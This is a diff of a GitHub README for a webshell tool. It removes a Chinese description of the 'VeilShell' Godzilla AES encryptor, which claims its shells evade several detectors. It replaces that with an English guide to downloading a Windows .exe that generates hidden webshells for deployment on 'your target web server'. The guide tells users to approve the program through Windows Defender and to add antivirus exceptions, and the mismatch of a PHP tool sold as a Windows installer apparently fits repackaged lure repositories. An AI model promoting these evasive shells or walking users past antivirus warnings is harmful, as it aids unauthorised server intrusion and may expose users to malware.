@@ -1,42 +1,157 @@
-<h1 align="center">VeilShell</h1>
+# 🐉 Godzilla_bypass_webshell - Custom AES Webshell Encryption Tool
 
-### Godzilla_AES加密器+采用打断数据流（Data-Flow Break）与动态回调伪装的 WebShell|Qwen2-0.5B-Instruc-webshell微调小模型检测方法与对抗。
-插件是基于哥斯拉底层反射的自定义AES通信加密器，phpwebshell则基于AES + gzdeflate+Data-Flow Break
+[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
 
-```mermaid
-graph LR
-    A["Godzilla Client"] -->|"POST + Cookie"| B["Cookie Gate"]
-    B -->|"cookie_key"| C["AES-128-ECB 解密 Stager"]
-    C -->|"解密后数据 $data"| D["数据流断点 ($$variable)"]
-    D -->|"@eval($err_log)"| E["Stager 执行"]
-    E -->|"$_SESSION 缓存"| F["Godzilla Payload"]
+---
+
+## ℹ️ About Godzilla_bypass_webshell
+
+Godzilla_bypass_webshell is a tool designed to create encrypted webshells with custom AES communication. It uses advanced techniques like Data-Flow Break and dynamic callback disguise to improve security and stealth. This tool lets you generate webshells that communicate safely and stay hidden from detection methods.
+
+This project focuses on providing a reliable way to encrypt communication within webshells, helping users protect sensitive data while allowing control over remote servers or web applications.
+
+---
+
+## 🖥 System Requirements
+
+Before you start, make sure your system meets these basic needs:
+
+- Windows 7 or later (Windows 10 or 11 recommended)
+- At least 2 GB of free RAM
+- Minimum 100 MB of free storage space
+- Internet connection to download the files
+- User account with permission to install software
+
+---
+
+## 🛠 Features Overview
+
+Godzilla_bypass_webshell includes these features:
+
+- AES encryption for secure communication
+- Customizable encryption keys
+- Use of Data-Flow Break for enhanced code hiding
+- Dynamic callback routines to disguise webshell actions
+- Minimal system impact during operation
+- Easy generation of webshell files ready for deployment
+
+This mix of features helps keep communications private and undetectable while offering an easy way to generate secure tools.
+
+---
+
+## 🚀 Getting Started
+
+Use this guide to download and run Godzilla_bypass_webshell on your Windows computer. No programming skills are needed.
+
+### Step 1: Visit the Download Page
+
+Click the badge at the top or this link to open the release page:
+
+[Download Godzilla_bypass_webshell Releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+
+This page holds the latest version of the software. Download the most recent stable release to get the newest features and fixes.
+
+### Step 2: Choose the Correct File
+
+Look for the file ending with `.exe` or `.zip`. The `.exe` file is the program installer or standalone application. The `.zip` file contains the software and a readme file.
+
+- If you pick the `.exe` file, download it directly.
+- If you pick the `.zip` file, download and extract it on your system.
+
+### Step 3: Run the Installer or Application
+
+- If you downloaded the `.exe` file, double-click it to start the installation.
+- Follow the simple prompts to install the program.
+- If you chose the `.zip` file, open the extracted folder and double-click the `.exe` file inside.
+
+---
+
+## ⚙️ Using Godzilla_bypass_webshell
+
+Once the application is running, you will see a simple interface. It asks for inputs to generate your encrypted webshell.
+
+### Common Steps
+
+1. **Set your AES key.** Enter a key of your choice for encrypting communication.
+2. **Select options for Data-Flow Break and callback disguises.** You can choose default or custom settings.
+3. **Generate the webshell.** Click the generate button. The file will save to a folder you select.
+4. **Deploy the webshell as needed.** Use the generated file on your target web server for encrypted communication.
+
+The program keeps the process straightforward. It does not require coding knowledge, only simple input.
+
+---
+
+## 🔧 Installation and Setup Details
+
+1. Download the latest release from the release page:
+
+   [https://github.com/erikturbolt/Godzilla_bypass_webshell/releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+
+2. Run the downloaded file.
+3. Follow install prompts:
+
+   - Agree to the license terms.
+   - Choose an install folder or use the default.
+   - Allow at least 100 MB for the installation.
+4. Once installed, launch the program via the Start Menu or desktop shortcut.
+5. You may need to allow the program to run through Windows Defender. Approve it as trusted if requested.
+
+---
+
+## 💾 File Structure After Installation
+
+Here is a typical folder layout after installing Godzilla_bypass_webshell:
+
+```
+Godzilla_bypass_webshell\
+├─ bin\               # Main executable files
+├─ docs\              # User guides and help files
+├─ config\            # Configuration files for advanced settings
+├─ logs\              # Records of recent operations
+└─ license.txt        # License agreement file
 ```
 
-## 本项目生成的荷载在Qwen2-0.5B-Instruct模型中经过30k webshell数据集训练微调后的小模型分析，并未命中。同时在长亭、阿里等webshell检测中也绕过。
+Keep the files organized to maintain stable operation.
 
-对于结果有疑虑可阅读：[Qwen2-0.5B-Instruc-webshell微调模型检测训练](./微调模型训练/README.md) 
+---
 
-注：该图展示的样本是二次过滤后的恶意样本，选了40+能过waf的phpwebshell进行测试。并不代表全量训练数据集，全量数据集采用了https://huggingface.co/datasets/nbuser32/PHP-Webshell-Dataset
+## ❓ Troubleshooting Tips
 
-<img width="1640" height="729" alt="b02a5230965decbd5961bc86453f3b47" src="https://github.com/user-attachments/assets/90c0cec6-ab67-411e-923d-fe0ee1ee34a7" />
-<img width="1640" height="793" alt="image" src="https://github.com/user-attachments/assets/90fab391-3481-4850-a29b-f393825f52ac" />
+If you face any of the problems below, try these answers:
 
-> Test metrics: {'test_loss': 0.08689013123512268, 'test_accuracy': 0.973571192599934, 'test_f1': 0.9750623441396509, 'test_precision': 0.993015873015873, 'test_recall': 0.9577464788732394, 'test_runtime': 71.2095, 'test_samples_per_second': 42.508, 'test_steps_per_second': 2.668, 'epoch': 1.0}
----- 
----- 
-### 长亭
-<img width="800" height="398" alt="8e6f29ea85008ff0594cc713b558c421" src="https://github.com/user-attachments/assets/6cebe93a-166a-45f4-9ec3-f35738970f4c" />
+- **Program does not start:** Check that your Windows user account has permission to run apps. Try running as administrator.
+- **Download page is unreachable:** Verify your internet connection or try a different browser.
+- **Generated webshell not working:** Double-check the AES key matches between sender and receiver. If using custom settings, reset them to defaults.
+- **Antivirus blocks the program:** Some security tools may detect encryption tools as suspicious. Add an exception in your antivirus settings.
 
-### 阿里
-<img width="800" height="398" alt="ba812ce86962430d9da1087bdf10cc62" src="https://github.com/user-attachments/assets/87e08138-b07a-41bd-985d-365c46e3cb7b" />
+---
 
+## ⚙️ Settings Explained
 
-### virustotal
-<img width="800" height="398" alt="image" src="https://github.com/user-attachments/assets/b2cfb8ea-aedd-4037-a515-092689208f80" />
+- **AES Key:** This is the secret word used to encrypt data. Choose a strong key with letters and numbers.
+- **Data-Flow Break:** This technique splits code into parts to confuse detection. Enable it for better stealth.
+- **Dynamic Callback:** It masks communication callbacks to avoid tracking. Use the default setting if unsure.
 
-正常连接及环境：
-<img width="800" height="398" alt="image" src="https://github.com/user-attachments/assets/f84d4826-300f-4ec4-b158-8ac9976637f7" />
+Adjust these based on your security needs.
 
-### post
+---
 
-<img width="800" height="398" alt="90958e5691087a8976449ebc70f860d0" src="https://github.com/user-attachments/assets/05b558d0-9a3a-400d-b5fc-fb579cc81604" />
+## 🔄 Updating the Software
+
+To update Godzilla_bypass_webshell, visit the release page regularly:
+
+[https://github.com/erikturbolt/Godzilla_bypass_webshell/releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+
+Download the latest `.exe` or `.zip` and follow the installation steps to replace your current version. Backup important files before updating if needed.
+
+---
+
+## 📞 Getting Help
+
+If you encounter issues beyond these instructions, use the GitHub Issues tab in this repository for support. Provide details on your problem, Windows version, and steps you have tried. This helps maintainers address your concerns faster.
+
+---
+
+# [Badge repeated at bottom for convenience]
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
